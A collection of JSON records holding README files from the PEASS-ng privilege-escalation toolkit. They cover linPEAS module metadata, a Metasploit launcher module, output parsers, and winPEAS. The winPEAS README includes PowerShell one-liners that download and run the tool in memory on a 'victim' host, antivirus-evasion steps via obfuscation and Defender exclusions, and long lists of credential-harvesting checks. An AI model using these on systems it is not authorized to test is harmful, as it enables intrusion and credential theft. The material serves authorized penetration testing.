check_az_vm, check_do, check_gcp, check_ibm_vm, check_tencent_cvm, print_list\n# Global Variables: $is_aws_codebuild, $is_aws_ecs, $is_aws_ec2, , $is_aws_lambda, $is_az_app, $is_az_vm, $is_do, $is_gcp_vm, $is_gcp_function, $is_ibm_vm, $is_aws_ec2_beanstalk, $is_aliyun_ecs, $is_tencent_cvm\n# Initial Functions: check_gcp, check_aws_ecs, check_aws_ec2, check_aws_lambda, check_aws_codebuild, check_do, check_ibm_vm, check_az_vm, check_az_app, check_aliyun_ecs, check_tencent_cvm\n# Generated Global Variables:\n# Fat linpeas: 0\n# Small linpeas: 1\n\n<code>\n```\n\n### Metadata parts explained\n\n- **Title**: Title of the module\n- **ID**: Unique identifier of the module. It has to be the same as the filename without the extension and with the section identifier as prefix (in this case `CL`)\n- **Author**: Author of the module\n- **Last Update**: Last update of the module\n- **Description**: Description of the module\n- **License**: License of the module\n- **Version**: Version of the module\n- **Functions Used**: Functions used by the module inside the bash code. If your module is using a function not defined here, linpeas won't be built.\n- **Global Variables**: Global variables used by the module inside the bash code. If your module is using a global variable not defined here, linpeas won't be built.\n- **Initial Functions**: Functions that are called at the beggining of the module. If your module is using a function not defined here, linpeas won't be built.\n- **Generated Global Variables**: Global variables generated (given a relevant value) by the module. If your module is generating a global variable not defined here, linpeas won't be built.\n- **Fat linpeas**: Set only as 1 if the module is loading a third party app, if not 0.\n- **Small linpeas**: Set as 1 if it's a quick check, if not 0.", "timestamp": "2025-10-21T21:59:16.852371"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "metasploit/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/metasploit/README.md", "content": "# PEASS Post Exploitation Module for Metasploit\n\nYou can use this module to **automatically execute a PEASS script from a meterpreter or shell session obtained in metasploit**.\n\n## Manual Installation\nCopy the `peass.rb` file to the path `modules/post/multi/gather/` inside the metasploit installation.\n\nIn Kali: \n```bash\nsudo cp ./peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/\n# or\nsudo wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/metasploit/peass.rb -O /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb\n```\n\nNow you can do `reload_all` inside a running msfconsole or the next time you launch a new msfconsole the peass module will be **automatically loaded**.\n\n## How to use it\n```\nmsf6 exploit(multi/handler) > use post/multi/gather/peass\nmsf6 post(multi/gather/peass) > show info\n\n       Name: Multi PEASS launcher\n     Module: post/multi/gather/peass\n   Platform: BSD, Linux, OSX, Unix, Windows\n       Arch: \n       Rank: Normal\n\nProvided by:\n  Carlos Polop <@hacktricks_live>\n\nCompatible session types:\n  Meterpreter\n  Shell\n\nBasic options:\n  Name        Current Setting                                                           Required  Description\n  ----        ---------------                                                           --------  -----------\n  PARAMETERS                                                                            no        Parameters to pass to the script\n  PASSWORD    um1xipfws17nkw1bi1ma3bh7tzt4mo3e                                          no        Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used\n\n  WINPEASS    true                                                                      yes       Use PEASS for Windows or PEASS for linux. Default is windows change to false for linux.\n  CUSTOM_URL                                                                            no        Path to the PEASS script. Accepted: http(s):// URL or absolute local path.\n                                            \n  SESSION                                                                               yes       The session to run this module on.\n  SRVHOST                                                                               no        Set your metasploit instance IP if you want to download the PEASS script from here via http(s) instead of uploading it.\n  SRVPORT     443                                                                       no        Port to download the PEASS script from using http(s) (only used if SRVHOST)\n  SSL         true                                                                      no        Indicate if you want to communicate with https (only used if SRVHOST)\n  SSLCert                                                                               no        Path to a custom SSL certificate (default is randomly generated)\n  TEMP_DIR                                                                              no        Path to upload the obfuscated PEASS script inside the compromised machine. By default \"C:\\Windows\\System32\\spool\\drivers\\color\" is used in\n                                                                                                   Windows and \"/tmp\" in Unix.\n  TIMEOUT     900                                                                       no        Timeout of the execution of the PEASS script (15min by default)\n  URIPATH     /mvpo.txt                                                                 no        URI path to download the script from there (only used if SRVHOST)\n\nDescription:\n  This module will launch the indicated PEASS (Privilege Escalation \n  Awesome Script Suite) script to enumerate the system. You need to \n  indicate the URL or local path to LinPEAS if you are in some Unix or \n  to WinPEAS if you are in Windows. By default this script will upload \n  the PEASS script to the host (encrypted and/or encoded) and will \n  load it and execute it. You can configure this module to download \n  the encrypted/encoded PEASS script from this metasploit instance via \n  HTTP instead of uploading it.\n\nReferences:\n  https://github.com/peass-ng/PEASS-ng\n  https://www.youtube.com/watch?v=9_fJv_weLU0\n```\n\nThe options are pretty self-explanatory.\n\nNotice that **by default** the obfuscated PEASS script if going to be **uploaded** but if you **set SRVHOST it will be downloaded** via http(s) from the metasploit instance (**so nothing will be written in the disk of the compromised host**).\n\nNotice that you can **set parametes** like `-h` in `PARAMETERS` and then linpeas/winpeas will just show the help (*just like when you execute them from a console*).\n\n**IMPORTANT**: You won't see any output until the execution of the script is completed.\n", "timestamp": "2025-10-21T21:59:21.267494"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "parsers/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/parsers/README.md", "content": "# Privilege Escalation Awesome Scripts Parsers\n\nThese scripts allows you to transform the output of linpeas/macpeas/winpeas to JSON and then to PDF and HTML.\n\n```python3\npython3 peas2json.py </path/to/executed_peass.out> </path/to/peass.json>\npython3 json2pdf.py </path/to/peass.json> </path/to/peass.pdf>\npython3 json2html.py </path/to/peass.json> </path/to/peass.html>\n```\n\n\n## JSON Format\nBasically, **each section has**:\n - Infos (URLs or info about the section)\n - Text lines (the real text info found in the section, colors included)\n - More sections\n\nThere is a **maximun of 3 levels of sections**.\n\n```json\n{\n  \"<Main Section Name>\": {\n    \"sections\": {\n      \"<Secondary Section Name>\": {\n        \"sections\": {},\n        \"lines\": [\n          {\n            \"raw_text\": \"\\u001b[0m\\u001b[1;33m[+] \\u001b[1;32mnmap\\u001b[1;34m is available for network discover & port scanning, you should use it yourself\",\n            \"clean_text\": \"[+]  is available for network discover & port scanning, you should use it yourself\",\n            \"colors\": {\n                \"GREEN\": [\n                    \"nmap\"\n                ],\n                \"YELLOW\": [\n                    \"[+]\"\n                ]\n            }\n          }\n        ],\n        \"infos\": [\n          \"https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits\"\n        ]\n      },\n      \"infos\": []\n```\n\n```json\n{\n  \"System Information\": {\n    \"sections\": {\n      \"Operative system\": {\n        \"sections\": {},\n        \"lines\": [\n          {\n            \"raw_text\": \"\\u001b[0m\\u001b[1;33m[+] \\u001b[1;32mnmap\\u001b[1;34m is available for network discover & port scanning, you should use it yourself\",\n            \"clean_text\": \"[+]  is available for network discover & port scanning, you should use it yourself\",\n            \"colors\": {\n                \"GREEN\": [\n                    \"nmap\"\n                ],\n                \"YELLOW\": [\n                    \"[+]\"\n                ]\n            }\n          }\n        ],\n        \"infos\": [\n          \"https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits\"\n        ]\n      },\n      \"infos\": []\n```\n\n\nThere can also be a `<Third level Section Name>`\n\nIf you need to transform several outputs check out https://github.com/mnemonic-re/parsePEASS\n\n# TODO:\n\n- **PRs improving the code and the aspect of the final PDFs and HTMLs are always welcome!**\n", "timestamp": "2025-10-21T21:59:21.992762"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/README.md", "content": "# Windows Privilege Escalation Awesome Scripts\n\n![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/winpeas.png)\n\nCheck the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)**\n\nCheck more **information about how to exploit** found misconfigurations in **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)**\n\n## Quick Start\nFind the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.\n\n## WinPEAS Flavours\n- [Link to WinPEAS C# .exe project](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) (.Net >= 4.5.2 required)\n    - **Please, read the Readme of that folder to learn how to execute winpeas from memory or how make colors work among other tricks**\n- [Link to WinPEAS .ps1 project](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1)\n- [Link to WinPEAS .bat project](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat) \n\n\n## PEASS Style\n\nAre you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas\n\n## Advisory\n\nAll the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.\n", "timestamp": "2025-10-21T21:59:22.618588"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASbat/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASbat/README.md", "content": "# Windows Privilege Escalation Awesome Script (.bat)\n\n![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/winpeas.png)\n\n**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)**\n\nCheck also the **Local Windows Privilege Escalation checklist** from [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)\n\n### WinPEAS.bat is a batch script made for Windows systems which don't support WinPEAS.exe (Net.4 required)\n\nUnfortunately this script **does not support colors** so you will need to know what are you looking for in each test and, also, you will have to know how to learn the icacls output, see below.\n\n## Windows PE using CMD (.bat)\n\nIf you want to search for files and registry that could contain passwords, set to *yes* the *long* variable at the beginning of the script.\n\nThe script will use acceschk.exe if it is available (with that name). But it is not necessary, it also uses wmic + icacls.\n\nSome of the tests in this script were extracted from **[here](https://github.com/enjoiz/Privesc/blob/master/privesc.bat)** and from **[here](https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)**\n\n\n### Main checks\n\n<details>\n  <summary>Details</summary>\n\n- [x] Systeminfo --SO version and patches-- (windows suggester)\n- [x] Common known exploits (2K, XP, 2K3, 2K8, Vista, 7)\n- [x] Audit Settings\n- [x] WEF Settings\n- [x] LAPS installed?\n- [x] LSA protection?\n- [x] Credential Guard?\n- [x] WDigest?\n- [x] Number of cached cred\n- [x] UAC Settings\n- [x] AV?\n- [x] PS Settings\n- [x] Mounted disks\n- [x] SCCM installed?\n- [x] Remote Desktop Credentials Manager?\n- [x] WSUS Settings\n- [x] Processes list\n- [x] Interesting file permissions of binaries being executed \n- [x] Interesting file permissions of binaries run at startup\n- [x] AlwaysInstallElevated?\n- [x] Network info (see below)\n- [x] Users info (see below)\n- [x] Current user privileges \n- [x] Service binary permissions \n- [x] Check if permissions to modify any service registy\n- [x] Unquoted Service paths  \n- [x] DLL Hijacking in PATH\n- [x] Windows Vault\n- [x] DPAPI Master Keys\n- [x] AppCmd.exe?\n- [x] Check for unattended files\n- [x] Check for SAM & SYSTEM backups\n- [x] Check for cached GPP Passwords\n- [x] Check for McAffe SiteList.xml files\n- [x] Check for Cloud credentials\n- [x] Search for known registry to have passwords and keys inside (Winlogon...)\n- [x] Search for known files to have passwords inside (can take some minutes)\n- [x] If *long*, search files with passwords inside \n- [x] If *long*, search registry with passwords inside \n\n### More enumeration\n\n- [x] Date & Time\n- [x] Env\n- [x] Installed Software\n- [x] Running Processes \n- [x] Current Shares \n- [x] Network Interfaces\n- [x] Used Ports\n- [x] Firewall\n- [x] ARP\n- [x] Routes\n- [x] Hosts\n- [x] Cached DNS\n- [x] Info about current user (PRIVILEGES)\n- [x] List groups (info about administrators)\n- [x] Current logon users \n\n</details>\n\n### Understanding icacls permissions\n\nIcacls is the program used to check the rights that groups and users have in a file or folder.\n\nIclals is the main binary used here to check permissions.\n\nIts output is not intuitive so if you are not familiar with the command, continue reading. Take into account that in XP you need administrators rights to use icacls (for this OS is very recommended to upload sysinternals accesschk.exe to enumerate rights).\n\n**Interesting permissions**\n\n```\nD - Delete access\nF - Full access (Edit_Permissions+Create+Delete+Read+Write)\nN - No access\nM - Modify access (Create+Delete+Read+Write)\nRX - Read and eXecute access\nR - Read-only access\nW - Write-only access\n```\n\nWe will focus in **F** (full), **M** (Modify access) and **W** (write).\n\n**Use of Icacls by WinPEAS**\n\nWhen checking rights of a file or a folder the script search for the strings: *(F)* or *(M)* or *(W)* and the string \":\\\" (so the path of the file being checked will appear inside the output).\n\nIt also checks that the found right (F, M or W) can be exploited by the current user.\n\nA typical output where you dont have any nice access is:\n```\nC:\\Windows\\Explorer.EXE NT SERVICE\\TrustedInstaller:(F)\n```\n\nAn output where you have some interesting privilege will be like:\n```\nC:\\Users\\john\\Desktop\\desktop.ini NT AUTHORITY\\SYSTEM:(I)(F)\n                                MYDOMAIN\\john:(I)(F)\n```\n\nHere you can see that the privileges of user *NT AUTHORITY\\SYSTEM* appears in the output because it is in the same line as the path of the binary. However, in the next line, you can see that our user (john) has full privileges in that file. \n\nThis is the kind of outpuf that you have to look for when usnig the winPEAS.bat script.\n\n[More info about icacls here](https://ss64.com/nt/icacls.html)\n\n## Advisory\n\nAll the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.\n", "timestamp": "2025-10-21T21:59:22.965169"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASexe/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md", "content": "# Windows Privilege Escalation Awesome Script (.exe)\n\n![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/winpeas.png)\n\n**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)**\n\nCheck also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)**\n\n[![youtube](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/screen.png)](https://youtu.be/66gOwXMnxRI)\n\n## Quick Start\n\n**.Net >= 4.5.2 is required**\n\nPrecompiled binaries:\n- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/peass-ng/PEASS-ng/releases/latest)** or **compile it yourself** (read instructions for compilation).\n\n```bash\n# Get latest release\n$url = \"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\"\n\n# One liner to download and execute winPEASany from memory in a PS shell\n$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest \"$url\" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(\"\")\n\n# The previous cmd in 2 lines\n$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest \"$url\" -UseBasicParsing | Select-Object -ExpandProperty Content));\n[winPEAS.Program]::Main(\"\") #Put inside the quotes the winpeas parameters you want to use\n\n# Download to disk and execute (super noisy)\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\", \"winPEASany_ofs.exe\")\n.\\winPEASany_ofs.exe\n\n# Load from disk in memory and execute:\n$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes(\"D:\\Users\\victim\\winPEAS.exe\")));\n[winPEAS.Program]::Main(\"\") #Put inside the quotes the winpeas parameters you want to use\n\n# Load from disk in base64 and execute\n##Generate winpeas in Base64:\n[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"D:\\Users\\user\\winPEAS.exe\")) | Out-File -Encoding ASCII D:\\Users\\user\\winPEAS.txt\n##Now upload the B64 string to the victim inside a file or copy it to the clipboard\n\n ##If you have uploaded the B64 as afile load it with:\n$thecontent = Get-Content -Path D:\\Users\\victim\\winPEAS.txt\n ##If you have copied the B64 to the clipboard do:\n$thecontent = \"aaaaaaaa...\" #Where \"aaa...\" is the winpeas base64 string\n##Finally, load binary in memory and execute\n$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))\n[winPEAS.Program]::Main(\"\") #Put inside the quotes the winpeas parameters you want to use\n\n# Loading from file and executing a winpeas obfuscated version\n##Load obfuscated version\n$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes(\"D:\\Users\\victim\\winPEAS-Obfuscated.exe\")));\n$wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from \"winPEAS.Program\"\n[<ReflectedType_from_before>]::Main(\"\") #Used the ReflectedType name to execute winpeas\n```\n\n## Parameters Examples\n\n```bash\nwinpeas.exe -h # Get Help\nwinpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)\nwinpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed\nwinpeas.exe notcolor #Do not color the output\nwinpeas.exe domain #enumerate also domain information\nwinpeas.exe wait #wait for user input between tests\nwinpeas.exe debug #display additional debug information\nwinpeas.exe log #log output to out.txt instead of standard output\nwinpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh)\nwinpeas.exe -lolbas  #Execute also additional LOLBAS search check\n```\n\n## Basic information\n\nThe goal of this project is to search for possible **Privilege Escalation Paths** in Windows environments.\n\nNew in this version:\n- Detect potential GPO abuse by flagging writable SYSVOL paths for GPOs applied to the current host and by highlighting membership in the \"Group Policy Creator Owners\" group.\n\n\nIt should take only a **few seconds** to execute almost all the checks and **some seconds/minutes during the lasts checks searching for known filenames** that could contain passwords (the time depened on the number of files in your home folder). By default only **some** filenames that could contain credentials are searched, you can use the **searchall** parameter to search all the list (this could will add some minutes).\n\nThe tool is based on **[SeatBelt](https://github.com/GhostPack/Seatbelt)**.\n\n### New (AD-aware) checks\n\n- Active Directory quick checks now include:\n  - gMSA readable managed passwords: enumerate msDS-GroupManagedServiceAccount objects and report those where the current user/group is allowed to retrieve the managed password (PrincipalsAllowedToRetrieveManagedPassword).\n  - AD CS (ESC4) hygiene: enumerate published certificate templates and highlight templates where the current user/group has dangerous control rights (GenericAll/WriteDacl/WriteOwner/WriteProperty/ExtendedRight) that could allow template abuse (e.g., ESC4 -> ESC1).\n\nThese checks are lightweight, read-only, and only run when the host is domain-joined.\n\n\n## Where are my COLORS?!?!?!\n\nThe **ouput will be colored** using **ansi** colors. If you are executing `winpeas.exe` **from a Windows console**, you need to set a registry value to see the colors (and open a new CMD):\n```\nREG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1\n```\n\nBelow you have some indications about what does each color means exacty, but keep in mind that **Red** is for something interesting (from a pentester perspective) and **Green** is something well configured (from a defender perspective).\n\n![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/colors.png)\n\n## Instructions to compile you own obfuscated version\n\n<details>\n  <summary>Details</summary>\n\nIn order to compile an **ofuscated version** of Winpeas and bypass some AVs you need to ** install dotfuscator ** in *VisualStudio*.\n\nTo install it *open VisualStudio --> Go to Search (CTRL+Q) --> Write \"dotfuscator\"* and just follow the instructions to install it.\n\nTo use **dotfuscator** you will need to **create an account** *(they will send you an email to the address you set during registration*).\n\nOnce you have installed and activated it you need to:\n1. **Compile** winpeas in VisualStudio\n2. **Open dotfuscator** app\n3. **Open** in dotfuscator **winPEAS.exe compiled**\n4. Click on **Build**\n5. The **single, minimized and obfuscated binary** will appear in a **folder called Dotfuscator inside the folder were winPEAS.exe** and the DLL were (this location will be saved by dotfuscator and by default all the following builds will appear in this folder).\n\n**I'm sorry that all of this is necessary but is worth it. Dotfuscator minimizes a bit the size of the executable and obfuscates the code**.\n\n![](https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASexe/images/dotfuscator.PNG)\n\n**IMPORTANT**: Note that Defender will higly probable delete the winpeas iintial unobfuscated version, so you need to set as expections the origin folder of Winpeas and the folder were the obfuscated version will be saved:\n![](https://user-images.githubusercontent.com/1741662/148418852-e7ffee6a-c270-4e26-bf38-bb8977b3ad9c.png)\n</details>\n\n## Checks\n\n<details>\n  <summary>Details</summary>\n\n- **System Information**\n  - [x] Basic System info information\n  - [x] Use Watson to search for vulnerabilities\n  - [x] Enumerate Microsoft updates\n  - [x] PS, Audit, WEF and LAPS Settings\n  - [x] LSA protection\n  - [x] Credential Guard\n  - [x] WDigest\n  - [x] Number of cached cred\n  - [x] Environment Variables\n  - [x] Internet Settings\n  - [x] Current drives information\n  - [x] AV\n  - [x] Windows Defender\n  - [x] UAC configuration\n  - [x] NTLM Settings\n  - [x] Local Group Policy\n  - [x] Applocker Configuration & bypass suggestions\n  - [x] Printers\n  - [x] Named Pipes\n  - [x] AMSI Providers\n  - [x] SysMon\n  - [x] .NET Versions\n\n- **Users Information**\n  - [x] Users information\n  - [x] Current token privileges\n  - [x] Clipboard text\n  - [x] Current logged users\n  - [x] RDP sessions\n  - [x] Ever logged users\n  - [x] Autologin credentials\n  - [x] Home folders\n  - [x] Password policies\n  - [x] Local User details\n  - [x] Logon Sessions\n\n- **Processes Information**\n  - [x] Interesting processes (non Microsoft)\n\n- **Services Information**\n  - [x] Interesting services (non Microsoft) information\n  - [x] Modifiable services\n  - [x] Writable service registry binpath\n  - [x] PATH Dll Hijacking\n\n- **Applications Information**\n  - [x] Current Active Window\n  - [x] Installed software\n  - [x] AutoRuns\n  - [x] Scheduled tasks\n  - [x] Device drivers\n\n- **Network Information**\n  - [x] Current net shares\n  - [x] Mapped drives (WMI)\n  - [x] hosts file\n  - [x] Network Interfaces\n  - [x] Listening ports\n  - [x] Firewall rules\n  - [x] DNS Cache (limit 70)\n  - [x] Internet Settings\n\n- **Cloud Metadata Enumeration**\n  - [x] AWS Metadata\n  - [x] GCP Metadata\n  - [x] Azure Metadata\n\n- **Windows Credentials**\n  - [x] Windows Vault\n  - [x] Credential Manager\n  - [x] Saved RDP settings\n  - [x] Recently run commands\n  - [x] Default PS transcripts files\n  - [x] DPAPI Masterkeys\n  - [x] DPAPI Credential files\n  - [x] Remote Desktop Connection Manager credentials\n  - [x] Kerberos Tickets\n  - [x] Wifi\n  - [x] AppCmd.exe\n  - [x] SSClient.exe\n  - [x] SCCM\n  - [x] Security Package Credentials\n  - [x] AlwaysInstallElevated\n  - [x] WSUS\n\n- **Browser Information**\n  - [x] Firefox DBs\n  - [x] Credentials in firefox history\n  - [x] Chrome DBs\n  - [x] Credentials in chrome history\n  - [x] Current IE tabs\n  - [x] Credentials in IE history\n  - [x] IE Favorites\n  - [x] Extracting saved passwords for: Firefox, Chrome, Opera, Brave\n\n- **Interesting Files and registry**\n  - [x] Putty sessions\n  - [x] Putty SSH host keys\n  - [x] SuperPutty info\n  - [x] Office365 endpoints synced by OneDrive\n  - [x] SSH Keys inside registry\n  - [x] Cloud credentials\n  - [x] Check for unattended files\n  - [x] Check for SAM & SYSTEM backups\n  - [x] Check for cached GPP Passwords\n  - [x] Check for and extract creds from McAffe SiteList.xml files\n  - [x] Possible registries with credentials\n  - [x] Possible credentials files in users homes\n  - [x] Possible password files inside the Recycle bin\n  - [x] Possible files containing credentials (this take some minutes)\n  - [x] User documents (limit 100)\n  - [x] Oracle SQL Developer config files check\n  - [x] Slack files search\n  - [x] Outlook downloads\n  - [x] Machine and user certificate files\n  - [x] Office most recent documents\n  - [x] Hidden files and folders\n  - [x] Executable files in non-default folders with write permissions\n  - [x] WSL check\n\n- **Events Information**\n  - [x] Logon + Explicit Logon Events\n  - [x] Process Creation Events\n  - [x] PowerShell Events\n  - [x] Power On/Off Events\n\n- **Additional (slower) checks**\n  - [x] LOLBAS search\n  - [x] run **[linpeas.sh](https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh)** in default WSL distribution\n\n</details>\n\n## TODO\n- Add more checks\n- Mantain updated Watson (last JAN 2021)\n\nIf you want to help with any of this, you can do it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues)** or you can submit a pull request.\n\nIf you find any issue, please report it using **[github issues](https://github.com/peass-ng/PEASS-ng/issues)**.\n\n**WinPEAS** is being **updated** every time I find something that could be useful to escalate privileges.\n\n## Advisory\n\nAll the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.\n", "timestamp": "2025-10-21T21:59:23.524401"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASexe/winPEAS/3rdParty/BouncyCastle/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/winPEAS/3rdParty/BouncyCastle/README.md", "content": "# The Bouncy Castle Crypto Package For C Sharp\n\nThe Bouncy Castle Crypto package is a C\\# implementation of cryptographic algorithms and protocols, it was developed by the Legion of the Bouncy Castle, a registered Australian Charity, with a little help! The Legion, and the latest goings on with this package, can be found at [https://www.bouncycastle.org](https://www.bouncycastle.org). In addition to providing basic cryptography algorithms, the package also provides support for CMS, TSP, X.509 certificate generation and a variety of other standards such as OpenPGP.\n\nThe Legion also gratefully acknowledges the contributions made to this package by others (see [here](https://www.bouncycastle.org/csharp/contributors.html) for the current list). If you would like to contribute to our efforts please feel free to get in touch with us or visit our [donations page](https://www.bouncycastle.org/donate), sponsor some specific work, or purchase a support contract through [Crypto Workshop](https://www.cryptoworkshop.com).\n\nExcept where otherwise stated, this software is distributed under a license based on the MIT X Consortium license. To view the license, [see here](https://www.bouncycastle.org/licence.html). The OpenPGP library also includes a modified BZIP2 library which is licensed under the [Apache Software License, Version 2.0](http://www.apache.org/licenses/). \n\n**Note**: this source tree is not the FIPS version of the APIs - if you are interested in our FIPS version please contact us directly at  [office@bouncycastle.org](mailto:office@bouncycastle.org).\n\n## Mailing Lists\n\nFor those who are interested, there are 2 mailing lists for participation in this project. To subscribe use the links below and include the word subscribe in the message body. (To unsubscribe, replace **subscribe** with **unsubscribe** in the message body)\n\n*   [announce-crypto-csharp-request@bouncycastle.org](mailto:announce-crypto-csharp-request@bouncycastle.org)  \n    This mailing list is for new release announcements only, general subscribers cannot post to it.\n*   [dev-crypto-csharp-request@bouncycastle.org](mailto:dev-crypto-csharp-request@bouncycastle.org)  \n    This mailing list is for discussion of development of the package. This includes bugs, comments, requests for enhancements, questions about use or operation.\n\n**NOTE:**You need to be subscribed to send mail to the above mailing list.\n\n## Feedback \n\nIf you want to provide feedback directly to the members of **The Legion** then please use [feedback-crypto@bouncycastle.org](mailto:feedback-crypto@bouncycastle.org), if you want to help this project survive please consider [donating](https://www.bouncycastle.org/donate).\n\nFor bug reporting/requests you can report issues here on github, via feedback-crypto if required. We will accept pull requests based on this repository as well, but only on the basis that any code included may be distributed under the [Bouncy Castle License](https://www.bouncycastle.org/licence.html).\n\n## Finally\n\nEnjoy!\n", "timestamp": "2025-10-21T21:59:37.290865"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASexe/winPEAS/3rdParty/SQLite/README.txt", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/winPEAS/3rdParty/SQLite/README.txt", "content": "=================================================================================================\n\n$Header$\n=================================================================================================\n\nProject Descriptions -- See the Wiki Projects for details\n\nPlease read HowToCompile for instruction on settings and compiler options\n\n", "timestamp": "2025-10-21T21:59:43.604994"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASexe/winPEAS/3rdParty/YamlSerializer/ChangeLog.txt", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/winPEAS/3rdParty/YamlSerializer/ChangeLog.txt", "content": "Ôªø--- 2009-10-04 Osamu TAKEUCHI <osamu@big.jp>\nAlpha release of YamlSerializer as 0.9.0.2\n\n* All \"_\"s in integer and floating point values are neglected\n  to accommodate the !!int and !!float encoding.\n* YamlConfig.DontUseVerbatimTag is added but the default value is set false.\n  Note that !<!System.Int32[,]> is much human friendly than !System.Int32%5B%2C%5D.\n* Equality of YamlNode with an unknown tag is evaluated by identity,\n  while that of !!map and !!seq node is still evaluated by YAML's standard.\n  Note that equality of !!map and !!seq are different from that of object[]\n  and Dictionary<object, object>.\n* YamlConfig.OmitTagForRootNode was added. Fixed issue #2850.\n* Serialize Dictionary<object,object> to !!map. Fixed #2891.\n* Modified [126-130] ns-plain-???, [147] c-ns-flow-map-separate-value(n,c)\n  to accommodate revision 2009-10-01\n* Omit !< > if Tag contains only ns-tag-char, Fixed issue #2813\n\n--- 2009-09-23 Osamu TAKEUCHI <osamu@big.jp>\nAlpha release of YamlSerializer as 0.9.0.1\n\n* Removed TODO's for reporting bugs in YAML spec that are done.\n* Fixed assembly copyright.\n* !!merge is supported. Fixed issue#2605.\n* Read-only class-type member with no child members are omitted when \n  serializing. Fixed issue#2599.\n* Culture for TypeConverter is set to be CultureInfo.InvariantCulture. \n  Fixed issue #2629.\n* To fix Issue#2631\n  * Field names and property names are always presented as simple texts.\n  * When deserializing, we can not avoid the parser parses some spacial\n    names to !!bool and !!null. Such non-text nodes are converted to\n    texts at construction stage.\n* To fix issue#2663\n  * Hash code stored in a mapping node is now updated when the a key node's\n    content is changed.\n  * Hash code and equality became independent on the order of keys in a 